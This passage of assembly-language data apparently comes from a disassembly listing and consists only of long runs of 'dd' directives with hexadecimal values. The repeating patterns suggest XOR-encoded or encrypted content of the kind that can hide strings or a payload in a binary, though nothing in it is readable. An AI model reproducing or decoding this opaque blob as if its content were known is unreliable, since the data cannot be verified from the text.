		dd 0ED0149ADh, 0EFFD00EEh, 10EE5B60h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 2FF1002h, 0EFFD00EFh, 0FF1002FFh, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFCh, 0EFFD00EEh, 10EE5B78h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0FFFDD68Dh
		dd 197CF820h, 0FD00EFFCh, 0FFFCA647h, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h,	10EEA470h
		dd 0E493EADDh, 0EFFD00EEh, 10EE5BD0h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0FF1002FFh, 0ED01B66Dh
		dd 0EFFCA85Fh, 0EFFD00h, 0FD00EFFDh, 0EFFCB3EBh, 0EE9D98h
		dd 0FD0144A1h, 0EFFD00EFh, 0EFFD00h, 0FD015961h, 0EFFC63ABh
		dd 0EE558Ch, 0FD00EFFDh, 0EFFD00EFh, 0EE4A2Eh, 0FD018F89h
		dd 0EFFCA8F7h, 0EFFD00h, 0FD00EFFDh, 0EFFCB815h, 0EE9D00h
		dd 0FD0144B1h, 0EFFD00EFh, 0EFFD00h, 0FD0156BBh, 0EFFC63DBh
		dd 0EE5130h, 0FD00EFFDh, 0EFFD00EFh, 0EE44A0h, 0FD018BE5h
		dd 0EFFCA86Fh, 0EFFD00h, 0FD00EFFDh, 0EFFCBA8Dh, 0EE9D68h
		dd 0FD0144DDh, 0EFFD00EFh, 0EFFD00h, 0FD01558Dh, 0EFFC63E7h
		dd 0EE57A0h, 0FD00EFFDh, 0EFFD00EFh, 0EE4694h, 0FD018D75h
		dd 0EFFCAA8Bh, 0EFFD00h, 0FD00EFFDh, 0EFFCBFA5h, 0EE9F4Ch
		dd 0FD0143B9h, 0EFFD00EFh, 0EFFD00h, 0FD012F89h, 0EFFC64C3h
		dd 0EE5188h, 0FD00EFFDh, 0EFFD00EFh, 0EE3D98h, 0FD018B8Dh
		dd 0EFFCAAF3h, 0EFFD00h, 0FD00EFFDh, 0EFFCC04Bh, 0EE9F04h
		dd 0FD0144BDh, 0EFFD00EFh, 0EFFD00h, 0FD012F21h, 0EFFC63C7h
		dd 0EE51E0h, 0FD00EFFDh, 0EFFD00EFh, 0EE3C14h, 0FD018B35h
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD015829h, 0EFFCB80Bh, 0EE45D0h, 0FD015743h, 0EFFCB841h
		dd 0EE459Ch, 0FD015771h, 0EFFCB893h, 0EE4A38h, 0FD0158BBh
		dd 0EFFCB7B5h, 0EE4A68h, 0FD015885h, 0EFFCB765h, 0EE4A98h
		dd 0FD015853h, 0EFFCB755h, 0EE4AE4h, 0FD015809h, 0EFFCB8E9h
		dd 0EE4516h, 0FD0157D5h, 0EFFCB8D7h, 0EE4550h, 0FD015795h
		dd 0EFFD00EFh, 0EE44ACh, 0FD015635h, 0EFFD00EFh, 0EE4BF2h
		dd 0FD0158F5h, 0EFFCB657h, 0EE4BCCh, 0FD0158E9h, 0EFFCB647h
		dd 0EE4BFEh, 0FD01591Fh, 0EFFD00EFh, 0EE4DC4h, 0FD015F27h
		dd 0EFFCB003h, 0EE4DFCh, 0FD015EEFh, 0EFFCB1C5h, 0EE4C44h
		dd 0FD015EADh, 0EFFCB18Fh, 0EE4C70h, 0FD015E83h, 0EFFCB17Dh
		dd 0EE4C9Eh, 0FD015E49h, 0EFFCB12Bh, 0EE4CD0h, 0FD015E1Fh
		dd 0EFFCB119h, 0EE4DB0h, 0FD015DF7h, 0EFFCB2F7h, 0EE4F28h
		dd 0FD015DC7h, 0EFFCB2B9h, 0EE4F64h, 0FD015D89h, 0EFFCB26Dh
		dd 0EE4F90h, 0FD015D63h, 0EFFCB243h, 0EE4FC2h, 0FD015D2Fh
		dd 0EFFCB203h, 0EE4FF8h, 0FD015F5Fh, 0EFFCB069h, 0EE4D7Ah
		dd 0FD015F99h, 0EFFCB0BBh, 0EE4D3Ch, 0FD015FE7h, 0EFFCB0E1h
		dd 0EE52F8h, 0FD014011h, 0EFFCAF31h, 0EE52C6h, 0FD014053h
		dd 0EFFCAF4Fh, 0EE5288h, 0FD014091h, 0EFFCAFB3h, 0EE5250h
		dd 0FD0140C3h, 0EFFCAFC1h, 0EE521Ch, 0FD0140F3h, 0EFFCAE11h
		dd 0EE53EEh, 0FD01411Dh, 0EFFCAE39h, 0EE53CAh, 0FD014149h
		dd 0EFFCAE49h, 0EE5390h, 0FD01417Dh, 0EFFCAE9Dh, 0EE535Ch
		dd 0FD0141BBh, 0EFFCAED7h, 0EE5324h, 0FD0141E9h, 0EFFCAEEBh
		dd 0EE51ECh, 0FD01420Bh, 0EFFCAD0Fh, 0EE50D0h, 0FD014243h
		dd 0EFFCAD47h, 0EE509Ah, 0FD014271h, 0EFFCAD93h, 0EE5070h
		dd 0FD01429Fh, 0EFFCADBFh
		dd 0EE5044h, 0FD0142C5h, 0EFFCADC7h, 0EE5018h, 0FD0142FDh
		dd 0EFFCAC17h, 0EFFD00h, 7D00F520h, 6FFD03CFh, 80EFFEABh
		dd 7D00EDE4h, 6FFD1917h, 80EFF7CCh, 7D00FFDCh, 6FFD0371h
		dd 80EFFE9Ch, 7D00EC67h, 6FFD02F8h, 80EFFE5Ah, 7D00F5FAh
		dd 6FFD03B3h, 80EFEDB6h, 7D00E4FFh, 6FFD02F3h, 0EFFD00h
		dd 0FD0153F1h, 0EFFCBB03h, 0EE412Ch, 0FD0150FDh, 0EFFCBE03h
		dd 0EE439Eh, 0FD0151ADh, 0EFFCBD13h, 0EE40AAh, 0FD0152AFh
		dd 0EFFCBDE7h, 0EE41ACh, 0FD0153A1h, 0EFFCBCABh, 0EFFD00h
		dd 0FD012ED1h, 0EFFCBB89h, 0EE3C22h, 0FD015421h, 0EFFCBB3Fh
		dd 0EE46B8h, 0FD015453h, 0EFFCBB4Fh, 0EE4682h, 0FD015485h
		dd 0EFFCBB81h, 0EE3C38h, 0FD0154A3h, 0EFFCBBB9h, 0EE464Ch
		dd 0FD0154BFh, 0EFFCBBC3h, 0EE4624h, 0FD0154E1h, 0EFFCBBFDh
		dd 0EE4602h, 0FD015505h, 0EFFCBA07h, 0EE47D4h, 0FD015531h
		dd 0EFFCBA57h, 0EE47AEh, 0FD01555Bh, 0EFFCBA73h, 0EE4792h
		dd 0FD015575h, 0EFFD00EFh, 0EE472Ch, 0FD0155CBh, 0EFFCBAA5h
		dd 0EE44E2h, 0FD015605h, 0EFFCBAFDh, 0EE4722h, 0FD00EFFDh
		dd 0EFFCC029h, 0EE3DAEh, 0FD00EFFDh, 0EFFCB9E7h, 0EE4422h
		dd 0FD0156C9h, 0EFFD00EFh, 0EE4E38h, 0FD01596Dh, 0EFFCB3FDh
		dd 0EE4E1Eh, 0FD01597Fh, 0EFFCB3A1h, 0EE4E68h, 0FD015C8Bh
		dd 0EFFCB363h, 0EE4E9Ch, 0FD015C4Dh, 0EFFCB32Bh, 0EE4ED0h
		dd 0FD015C1Fh, 0EFFCB317h, 0EE490Ch, 0FD015BE7h, 0EFFCB4C7h
		dd 0EE4936h, 0FD015BB9h, 0EFFCB4BBh, 0EE4962h, 0FD015B87h
		dd 0EFFCB465h, 0EE4998h, 0FD015B57h, 0EFFCB457h, 0EE49CAh
		dd 0FD015B27h, 0EFFCB407h, 0EE49FAh, 0FD015AF3h, 0EFFCB5CFh
		dd 0EE4830h, 0FD01598Dh, 0EFFCB68Fh, 0EE4B50h, 0FD0159C1h
		dd 0EFFCB6CFh, 0EE4B0Ch, 0FD015A05h, 0EFFCB507h, 0EE48D6h
		dd 0FD015A47h, 0EFFCB545h, 0EE489Ah, 0FD015A77h, 0EFFCB591h
		dd 0EE486Ah, 0FD015A9Fh, 0EFFCB5B7h, 0EE4844h, 0FD00EFFDh
		dd 0EFFCB97Fh, 0EE447Ch, 0FD015695h, 0EFFCB9BDh, 0EFFD00h
		dd 0FD012F9Dh, 0EFFCBFB9h, 0EE4266h, 0FD01507Dh, 0EFFCBF7Fh
		dd 0EE429Eh, 0FD01504Bh, 0EFFCBF2Bh, 0EE42E2h, 0FD01500Dh
		dd 0EFFCC0EDh, 0EE3D18h, 0FD012FDBh, 0EFFCC0D5h, 0EE3D52h
		dd 0FD01502Fh, 0EFFD00EFh, 80EFFD39h, 7D00EFFBh, 6FFD0080h
		dd 80EFFD0Ch, 0FD012F77h, 6FFD00E7h, 80EFFD14h,	7D00EFF6h
		dd 6FFD00FCh, 80EFFD12h, 7D00EFFEh, 6FFD00FFh, 80EFFD0Fh
		dd 7D00EFEAh, 6FFD00DBh, 80EFFD09h, 7D00EFF9h, 6FFD00FAh
		dd 80EFFD74h, 0FD012F83h, 6FFD009Ch, 0EFFD00h, 0FD012F1Bh
		dd 0EFFCC019h, 0EFFD00h, 8E6CEC31h, 8A91729Bh, 0EFBC6Eh
		dd 9153ECABh, 0EF8D658Ah, 6CA8FF05h, 91618D92h,	809065A2h
		dd 74BC8472h, 8E759B9Ch, 0EFFD78AAh, 65A8FCC5h,	8E79BC89h
		dd 0A690659Bh, 809B6Eh,	9847EE14h, 9D98569Bh, 6E809473h
		dd 0FD4197B8h, 86BB0021h, 6CAC996Eh, 0FD659C92h, 9DAA034Bh
		dd 468A8969h, 0FD658394h, 86BB003Dh, 69A9996Eh,	0BB749C8Fh
		dd 0AE986C86h, 0DBFD00h, 8E6F83BEh, 819C488Ah, 8A9164h
		dd 9852ED48h, 86BB648Eh, 0EF986Ch, 9456EC7Ch, 8E88749Dh
		dd 6C83BC6Ch, 0FD008C92h, 8ABA018Ch, 6C86BB74h,	8769BC98h
		dd 0EFAE008Ah, 618A8F43h, 94468A89h, 0EFBC6583h, 65A8FC7Dh
		dd 996FA289h, 0A9986C9Ah, 4E8A9169h, 0BC65829Ch, 0ECE600EFh
		dd 469B9853h, 0AD658394h, 9B936980h, 0EF8F65h, 9852ED3Fh
		dd 9C9C6583h, 749AB065h, 0FD009798h, 8EAA037Fh,	6FA98969h
		dd 9369BC8Fh, 0A0986C88h, 638A9762h, 0FF7DEF89h, 819870A0h
		dd 6E8A8B45h, 0FD00AE89h, 8ABA0130h, 6386A974h,	886FAC96h
		dd 0EFFD7481h, 65BCFE15h, 8F72AA89h, 80B07280h,	0EF9864h
		dd 9853ECCCh, 868F509Bh, 74868F6Fh, 9C6CAC84h, 0EFFD739Ch
		dd 70A0FF86h, 8F508198h, 9C986380h, 1ACFD73h, 0BE748ABAh
		dd 8A8F729Ah, 72BF896Eh, 8E658C92h, 0EF99499Ch,	65A8FC46h
		dd 8F75AC89h, 9B93659Dh, 659D9554h, 99498B9Ch, 0EFAB00EFh
		dd 618A8F43h, 94468A89h, 0EFAA6583h, 72ACFD6Fh,	98748E98h
		dd 8A8F68BBh, 0EF9961h,	884DED88h, 0AD947483h, 548A8979h
		dd 9969B892h, 8E95438Ah, 280FD72h, 987680B0h, 8A9169A9h
		dd 0AE8545h, 9853ECE4h,	8394469Bh, 749BBC65h, 8862868Fh
		dd 0AE8E659Bh, 352FD00h, 8F749C91h, 0AE89618Ch,	37AFD00h
		dd 0B86E86AAh, 0EF9E6597h, 78AAFDB9h, 8F509B94h, 9C986380h
		dd 19EFD73h, 0B1748ABAh, 0AA89738Eh, 72808F72h,	0FD60EFFDh
		dd 8E9872ACh, 75A29874h, 0BC788A89h, 0EF0500EFh, 658A8F46h
		dd 8F6286B1h, 0EF84728Eh, 65A8FCA0h, 9272BF89h,	8B99418Ch
		dd 739C9872h, 0FD4FEFFDh, 8E9872ACh, 76AA9874h,	0BC748198h
		dd 0ECA200EFh, 6D9D9854h, 89618194h, 9D95548Ah,	8B9C65h
		dd 9853ECEBh, 8A8B459Bh, 0EF896Eh, 9852ED2Fh, 8A90759Ch
		dd 659D9554h, 0FD008B9Ch, 81B402CCh, 61868969h,	987A8691h
		dd 9B9472ACh, 6C8E9E69h, 89638AAEh, 0EF936F86h,	65ABFD81h
		dd 98748A91h, 9B9472ACh, 6C8E9E69h, 89638AAEh, 0EF936F86h
		dd 69B9FE83h, 9C759B8Fh, 8A8F4683h, 2BEFD65h, 8B618AB1h
		dd 868F438Ah, 618C9474h, 9E65BC91h, 8192699Bh, 77FD00h
		dd 987481B8h, 868F439Dh, 618C9474h, 9E65BC91h, 8192699Bh
		dd 220FD00h, 98738AAFh,	8A8B459Bh, 0EF896Eh, 8E6CEC3Bh
		dd 9F9E729Bh, 0EFBC79h,	9349EDD4h, 838F659Bh, 65849E6Fh
		dd 9E78AA99h, 88936187h, 0C5FD65h, 9E6E8EBEh, 80B46C8Ah
		dd 176FD00h, 0AD748ABAh, 8E8B699Dh, 72BF9874h, 91698992h
		dd 8C98538Ah, 6E809474h, 986D8EB3h, 0EFFD419Ch,	65A8FCF3h
		dd 9369B889h, 9C8A6F8Bh, 659D9444h, 8F6F9B9Eh, 0EFFD4196h
		dd 6FA3FF52h, 944C8B9Ch, 9D9C728Dh, 0EFBC79h, 9457EC69h
		dd 87BE658Bh, 6FBB8F61h, 896C9AB0h, 9B844286h, 32FFD65h
		dd 8F749C91h, 0AE8D6D8Ch, 173FD00h, 0AD748ABAh,	8E8B699Dh
		dd 72BF9874h, 91698992h, 9D89538Ah, 41889369h, 0FD83EFFDh
		dd 8A9165ABh, 69A99874h, 0FD418A91h, 9DBE00A4h,	659B9C65h
		dd 987286B9h, 9D92748Ch, 0EFBC79h, 9847EEA3h, 8394469Bh
		dd 749BBC65h, 8862868Fh, 0AE8E659Bh, 89FD00h, 9C659DBEh
		dd 9DAD659Bh, 738A9E6Fh, 0FD00AE8Eh, 8ABA01BCh,	699DB974h
		dd 84548A8Bh, 0EFBC659Fh, 65A8FC4Eh, 8E69AB89h,	8A8F4684h
		dd 619FAE65h, 85458A9Eh, 0EE1600AEh, 569B9847h,	90758392h
		dd 8993498Ah, 61828F6Fh, 936F8689h, 0EE8B00AEh,	4C9B9847h
		dd 9E698892h, 9DB96C8Eh, 538A8B69h, 93699D89h, 0EFBC7388h
		dd 6FA3FF5Ch, 0BB6C8E9Eh, 0EF98659Dh, 69A9FDDCh, 984E8B93h
		dd 86BB7497h, 0AE986Ch,	924CEDA2h, 0BD91618Ch, 6C83BC65h
		dd 0FD008C92h, 80B102B7h, 41839C63h, 9E6F8391h,	0ED3900EFh
		dd 6F829852h, 94448A8Bh, 9B9E659Dh, 41968F6Fh, 0FF6EEFFDh
		dd 8A8B6FA2h, 65839446h, 0FCC1EFBCh, 0BC8965A8h, 659B8E79h
		dd 8F69AB90h, 8089638Ah, 0AE8472h, 9847EE8Eh, 8C924C9Bh
		dd 69BB9161h, 0FD008A90h, 8AB502F9h, 72A98D61h,	0FD008A98h
		dd 8ABA014Ch, 6F9DAD74h, 8E738A9Eh, 9F9C65A7h, 3B1FD00h
		dd 90728AA9h, 9B9C6E86h, 6F9DAD65h, 8E738A9Eh, 0EEBF00EFh
		dd 439B9847h, 98729D88h
		dd 9DAD7481h, 738A9E6Fh, 0FDBAEF8Eh, 9B9478AAh,	659D9554h
		dd 0FD008B9Ch, 9DAD0277h, 738A9E6Fh, 0B332DC8Eh, 0EF89788Ah
		dd 72BFFF96h, 8E658C92h, 0A9CF339Ch, 749C8F69h,	0FD72EFFDh
		dd 8E9872ACh, 6FBB9874h, 98688392h, 0DDCE7083h,	708E9353h
		dd 896F878Eh, 0EE0200EFh, 62809147h, 8F46839Ch,	0EFFD658Ah
		dd 6CA8FF0Ah, 91618D92h, 80916EBAh, 0EF9663h, 9147EDFEh
		dd 839C6280h, 6B8C924Ch, 0FCF8EFFDh, 8D926CA8h,	6CAE9161h
		dd 0FD638091h, 83BA02E8h, 6C8E9F6Fh, 987A86AEh,	0EF9800EFh
		dd 618A8F43h, 94508A89h, 0EFFD659Fh, 69ABFD8Ch,	936F8C8Eh
		dd 9B9E6581h, 65829C4Eh, 8D69BF99h, 0ED6C008Ah,	6B8A9850h
		dd 986D8EB3h, 9F94508Bh, 361FD65h, 89698EAAh, 0A28F6FA9h
		dd 699B9175h, 0B265838Dh, 8C986A8Dh, 0EF8E74h, 924CED9Ch
		dd 0BC91618Ch, 8A8769h,	8E6CEC3Eh, 829E729Bh, 0AE9470h
		dd 0B352AAB6h, 0DDCE4CAAh, 6C83992Eh, 0FFD7EFFDh, 9D8D7398h
		dd 669B9369h, 0FF68EFBCh, 0BF8965BCh, 658C9272h, 94579C8Eh
		dd 98926481h, 748E8953h, 0FD6E8094h, 9FB20114h,	69B89365h
		dd 8A6F8B93h, 9B9C74BCh, 41819269h, 0FC48EFFDh,	0BF8965A8h
		dd 658C9272h, 94579C8Eh, 98926481h, 748E8953h, 0FD6E8094h
		dd 8ABA01D5h, 738AB074h, 98678E8Eh, 0EDF800AEh,	749C9250h
		dd 987287A9h, 8AB0648Eh, 678E8E73h, 0FD00AE98h,	8ABA01F3h
		dd 7081B474h, 89539B88h, 0EF98748Eh, 69ABFDA1h,	89619F8Eh
		dd 8AB0688Ch, 678E8E73h, 0FD00AE98h, 9DA90245h,	6C9C9361h
		dd 0B0659B9Ch, 8E8E738Ah, 0EF9867h, 9543EFD7h, 8AB3728Eh
		dd 0AE8978h, 9847EE8Ah,	8194579Bh, 54989264h, 0BC749798h
		dd 0EEEA00EFh, 469B9847h, 9A659D92h, 81886F9Dh,	6E86AA64h
		dd 0FD778099h, 8ABA001Dh, 799CBC74h, 984B8C93h,	8E895396h
		dd 0EF9874h, 9847EEDCh,	96984B9Bh, 748E8953h, 0FCDFEF98h
		dd 9C8E65A2h, 428A9A61h, 0FD419792h, 81B80031h,	69B89075h
		dd 8A6F8B93h, 0EE47009Ch, 648E924Ch, 8E729ABEh,	0EFBC7280h
		dd 65ABFD95h, 92729B8Eh, 9D884396h, 9D9273h, 9142EFF3h
		dd 0A6966380h, 749A8D6Eh, 0FF99EFFDh, 9B8E79BCh, 61BF9065h
		dd 986D8E8Fh, 9C8F659Bh, 6F899349h, 0FF3BEFBCh,	8B9365BCh
		dd 739C984Dh, 0BC65889Ch, 0ED2800EFh, 6296986Bh, 8B65B099h
		dd 0EF896E8Ah, 61A2FCD6h, 8F69B98Dh, 839C759Bh,	4196984Bh
		dd 0FF44EFFDh, 0AC8965BCh, 759B8D61h, 0FD008A8Fh, 86AA023Bh
		dd 7780996Eh, 906F9DBBh, 81946FBFh, 2A0FD74h, 0BE748AAEh
		dd 808E729Ah, 7380AD72h, 0FFD6EFFDh, 9C886F82h,	768AA265h
		dd 0FD748198h, 83BE00ADh, 438A8E6Fh, 9F708691h,	8B8F6180h
		dd 2A5FD00h, 0BE748AAEh, 8D8D6983h, 649D9C6Fh, 9C748EB9h
		dd 0EF3C00EFh, 749F9045h, 946CAC84h, 8E92629Fh,	0EF9972h
		dd 8D4FEE0Bh, 83BE6E8Ah, 6F8D8D69h, 0FD649D9Ch,	8ABA01EEh
		dd 6983BE74h, 9C6F8D8Dh, 8EB9649Dh, 0EF9C74h, 9847EEA0h
		dd 9C84539Bh, 4D829874h, 94729B98h, 0EFFD738Ch,	65BCFF6Ch
		dd 9E65BD89h, 0EEF1009Bh, 449B9847h, 0FC0EEFBEh, 0AB8965A8h
		dd 74848E65h, 94579F92h, 98926481h, 2C5FD00h, 986C8AAFh
		dd 0AB98738Eh, 1E5FD43h, 0BE748ABAh, 808E729Ah,	6681B472h
		dd 0FC0BEF92h, 0AC8965A8h, 6F9C8F75h, 8E6FBF8Fh, 0EF1C00EFh
		dd 74868545h, 996E86AAh, 0AA8E7780h, 194FD78h, 0AA748ABAh
		dd 80996E86h, 7287A977h, 0AD648E98h, 8A9E6F9Dh,	64A68E73h
		dd 0FCB1EFFDh, 86AA73A6h, 7780996Eh, 947386ABh,	0EF986C8Dh
		dd 6CACFD43h, 0B9659C92h, 9B96738Ah, 0EF8D6Fh, 9853ED84h
		dd 9D95549Bh, 448B9C65h, 896B9C98h, 0EFFD7080h,	70A0FCFAh
		dd 93498198h, 0AB89759Fh, 74848E65h, 0FD009F92h, 8ABA0189h
		dd 659CA874h, 9762A08Fh, 0A689638Ah, 72809B6Eh,	94748E90h
		dd 0EFBC6E80h, 65A8FC61h, 8F68BB89h, 0AB99618Ah, 74848E65h
		dd 0FD009F92h, 9FB20118h, 65AB9365h, 9274848Eh,	0EFFD419Fh
		dd 6FBFFF02h, 984D9B8Eh, 889C739Ch, 0EFBC65h, 8F43EF9Dh
		dd 8A89618Ah, 64819457h, 85459892h, 0EFB900AEh,	73809143h
		dd 9369B898h, 0EF8A6F8Bh, 73A6FCADh, 996E86AAh,	0EFFD7780h
		dd 52AAAE55h, 992EDDCEh, 0EFFD6C83h, 65BCFF0Eh,	89638A91h
		dd 8A9762A0h, 0EF8963h,	8F43EFCFh, 8A89618Ah, 53ADB444h
		dd 94748C98h, 0EFFD6E80h, 72ACFD2Dh, 98748E98h,	9F906FACh
		dd 62868961h, 0BE448A91h, 0EF7200EFh, 65839844h, 9F4F8A89h
		dd 9B9E6585h, 63FD00h, 986C8AB9h, 0ACB9659Bh, 0FDFD00h
		dd 0BF7486BFh, 0EFFD7483h, 65A8FC6Ah, 0BF49AB89h, 0EF8E7486h
		dd 72ACFD2Ch, 98748E98h, 9F906FACh, 62868961h, 94428A91h
		dd 9F9C6D9Bh, 44A8FD00h, 0D332DCB4h, 0EF916C8Bh, 65BDFCCBh
		dd 926CAC9Ah, 8AB6659Ch, 118FD79h, 0AC678AAFh, 968F659Ah
		dd 75839C56h, 0BC78AA98h, 0EE1600EFh, 4F889852h, 0B66E8A8Dh
		dd 0EFBC798Ah, 65BDFCECh, 9870A09Ah, 96984B81h,	0AE8545h
		dd 9852EDF9h, 9B985388h, 75839C56h, 0BC78AA98h,	0EEBD00EFh
		dd 61B98E49h, 0AE648691h, 0EFFD6486h, 6FA3FC47h, 8D758492h
		dd 809E63AEh, 4E9B9375h, 0BC65829Ch, 0EEAB00EFh, 438E8E4Ch
		dd 98738091h, 0EE7900EFh, 528E8E4Ch, 94729B98h,	0BF98768Ah
		dd 61999472h, 9C448A89h, 0EFFD619Bh, 73A3FC75h,	9870A09Ch
		dd 83925081h, 969E69h, 8E4CEE99h, 8A8F468Eh, 6D8AB065h
		dd 0FD799D92h, 8AAF0119h, 659AAC67h, 9C56968Fh,	0AE987583h
		dd 0D2FD00h, 8E6F83BEh,	8A8B458Ah, 6FA3896Eh, 0FD39EF9Ah
		dd 8E986CACh, 6599B872h, 924C9B93h, 0EFFD4188h,	70A0FCAAh
		dd 8B458198h, 0A3896E8Ah, 0AE9A6Fh, 9941EFE1h, 9B8E7585h
		dd 65849254h, 9472BF93h, 8A916999h, 9C9867h, 924CEEB2h
		dd 9F886B80h, 76868F50h, 9A658394h, 839C568Ah, 0AE9875h
		dd 8D4FEE51h, 9DAD6E8Ah, 738A9E6Fh, 966FBB8Eh, 0EFFD6E8Ah
		dd 65BDFCE1h, 886EAA9Ah, 839C5682h, 0AE9875h, 9852EE23h
		dd 9A934588h, 798AB66Dh, 0FD4197B8h, 8AAF0137h,	6C8AB967h
		dd 0AB659B98h, 8A886C8Eh, 13BFD41h, 0B9678AAFh,	9B986C8Ah
		dd 798AB665h, 0FCD1EFBCh, 0AC9A65BDh, 748E9872h, 8465A498h
		dd 0EFBC78AAh, 6FA3FC49h, 8D758492h, 809E63AEh,	539B9375h
		dd 0FD418B94h, 8ABA01F5h, 6B80A974h, 93498198h,	828F6F89h
		dd 6F868961h, 0B941EF93h, 0A6AD41B9h, 64C1CF33h, 0FD008391h
		dd 0A7AE002Bh, 539B9847h, 94638A8Dh, 80BB6C8Eh,	728A996Ch
		dd 95748EADh, 0EF5100AEh, 65A8B553h, 9169A989h,	8993498Ah
		dd 0EFBC6Fh, 9553EEF4h,	0AA916C8Ah, 758C9878h, 85458A89h
		dd 0A7AE00AEh, 33A3B145h, 9164C1CFh, 0EF940083h, 659B9349h
		dd 8965818Fh, 9C926CACh, 6E8EB565h, 0FD658399h,	81B40075h
		dd 6E9D9874h, 98529B98h, 86BB648Eh, 0EF986Ch, 9349EF6Eh
		dd 818F659Bh, 70A08965h, 8F558198h, 0EFFD4183h,	6EA6FD92h
		dd 93728A89h, 9FB2748Ah, 0AE9365h, 0B44EA6AAh, 0C1A945A1h
		dd 839164h, 9C63EFFEh, 9B98479Fh, 76868F44h, 98449D98h
		dd 868F639Ch, 6F868970h, 0FD00AE93h, 8E9E00EEh,	659DBE70h
		dd 0BE659B9Ch, 9A89708Eh, 69B89872h, 8A6F8B93h,	0EFDB00AEh
		dd 65BCBE49h, 906FAC8Ch, 9C98729Fh, 619DBB73h, 0FD008A90h
		dd 0ACB400C7h, 439E9853h
		dd 8F708292h, 0A98E738Ah, 65829C72h, 8F619BAEh,	0EFD8009Bh
		dd 65BCBE49h, 984D8B93h, 889C739Ch, 0CDFD65h, 8D4FACB4h
		dd 0EFFD6E8Ah, 43A6FD13h, 8E6F83BEh, 0EFEB008Ah, 6FACBE49h
		dd 98729F90h, 9D92739Ch, 658A8F46h, 0FD27EFFDh,	8AAE43A6h
		dd 6D80BE71h, 8E659D8Dh, 8E8F469Ch, 6EAA986Dh, 0AB41EF99h
		dd 0BFBC43A6h, 64C1CF33h, 0FD008391h, 0A9AB53A2h, 2EDDCE57h
		dd 0FD6C8399h, 0B8B148BCh, 2EA6AD41h, 0FD6C8399h, 8A8F0248h
		dd 6F839161h, 0FF91EF9Eh, 83916182h, 0EF9E6Fh, 8973ED38h
		dd 9D89739Dh, 2B1FD00h,	98659D9Bh, 0ED3C00EFh, 6E9D8973h
		dd 0FD799F9Eh, 8AA20025h, 708A9E78h, 9C68B089h,	8A916481h
		dd 0EFCE72h, 9C72ED5Bh,	0EFFD6481h, 5FB0FD49h, 0BB7897BEh
		dd 8A90619Dh, 64819C48h, 0FD728A91h, 0D0C200E0h, 41B6BD32h
		dd 0B458AEADh, 0EFFD5AAFh, 749CFFC0h, 9063818Fh, 0EFED009Fh
		dd 40DCC23Fh, 0AD58AEA4h, 0B5BD58AEh, 277FD00h,	906D8A90h
		dd 0EF987680h, 658CFF41h, 0FD008394h, 89A2001Eh, 839274h
		dd 0BE5FEFBCh, 87A97897h, 45989272h, 8D658C85h,	8192699Bh
		dd 258FD00h, 9E729B8Eh,	0EFFD7287h, 749CFFC3h, 95639D8Fh
		dd 0EDC0009Dh, 69808961h, 0FFB4EFFDh, 819C729Ch, 23FFD64h
		dd 986D8689h, 0ED6300EFh, 6E868F70h, 0FD008989h, 9B8E0250h
		dd 618C9372h, 0FDA6EF89h, 889862B0h, 689B9369h,	99618A8Fh
		dd 0EFFD788Ah, 43B9AE4Dh, 992EBBAFh, 0EFFD6C83h, 5FB0FD55h
		dd 926C8399h, 86856581h, 169FD74h, 986E80A2h, 0EF896997h
		dd 3FD0FD0Eh, 8D799BCCh, 81945F8Ah, 40AF9266h, 0BD45AEA8h
		dd 0EFFD5AB7h, 69B0FC0Fh, 89748693h, 0EF90728Ah, 61B0FD9Dh
		dd 8E758599h, 8B9B5F9Bh, 0EF8B69h, 0C23FEF63h, 869349DFh
		dd 6F86BD74h, 9C62B08Eh, 9CBD659Ch, 40AF9974h, 0BD45AEACh
		dd 0EFFD5AB7h, 3FD0FC09h, 946EA6CCh, 8094409Bh,	618DA273h
		dd 8E408A8Eh, 0AFBD649Bh, 40AABC51h, 0FD00B5A5h, 0D0C2004Ah
		dd 69B8A230h, 0BD748693h, 0AF99749Ch, 45AEAC40h, 0FD5AB7BDh
		dd 0D0C201E2h, 69B8A231h, 0BD748693h, 0AF99749Ch, 45AEAC40h
		dd 0FD5AB7BDh, 0B0C20317h, 798B9454h, 9F24D0BDh, 8C94738Eh
		dd 729B8E5Fh, 0BD678194h, 0CBC255ABh, 728E9563h, 9C729BA2h
		dd 0AF8E7486h, 749CBD44h, 0AB40AF99h, 839C24D0h, 618C926Ch
		dd 0BD728089h, 0AFCF40ABh, 649B8E40h, 0BC41AFBDh, 0A1A258AAh
		dd 0EFA740h, 0A23FECD0h, 0DEC240ACh, 4EB0C23Fh,	8E6C8388h
		dd 0D0BD729Bh, 738E9F24h, 8E5F8C94h, 8194729Bh,	55ABBD67h
		dd 9563CBC2h, 9BA2728Eh, 74869C72h, 0BD44AF8Eh,	0AF99749Ch
		dd 24D0AB40h, 926C839Ch, 8089618Ch, 40ABBD72h, 8E40AFCFh
		dd 0AFBD649Bh, 42BFBC43h, 0BD5AB7B9h, 0EFBF44DBh, 3FD0FDE9h
		dd 9F24D0CCh, 8C94738Eh, 729B8E5Fh, 0BD678194h,	0CBC255ABh
		dd 728E9563h, 9C729BA2h, 0AF8E7486h, 749CBD44h,	0AB40AF99h
		dd 839C24D0h, 618C926Ch, 0BD728089h, 0AFCF40ABh, 649B8E40h
		dd 0BC51AFBDh, 0B5A540AAh, 4CFFD00h, 8E738EC2h,	0AF936786h
		dd 618DD93Fh, 0A263868Eh, 868F749Ch, 44AF9A6Eh,	9E24D0A8h
		dd 0B08F6187h, 698E8F74h, 0B9409C89h, 8B8973AFh, 3FB9BD40h
		dd 916C8ED9h, 9B9C6380h, 44AF8F6Fh, 0BD40DDBDh,	0AF99749Ch
		dd 45AEAC40h, 0CC56AEBCh, 0ADAD40DDh, 5AAFB444h, 0FE92EFFDh
		dd 9DBA5FD0h, 3FAF8A6Fh, 8E618DD9h, 9CA26386h, 6E868F74h
		dd 0A844AF9Ah, 879E24D0h, 74B08F61h, 89698E8Fh,	0AFB9409Ch
		dd 408B8973h, 0D93FB9BDh, 80916C8Eh, 6F9B9C63h,	0BD44AF8Fh
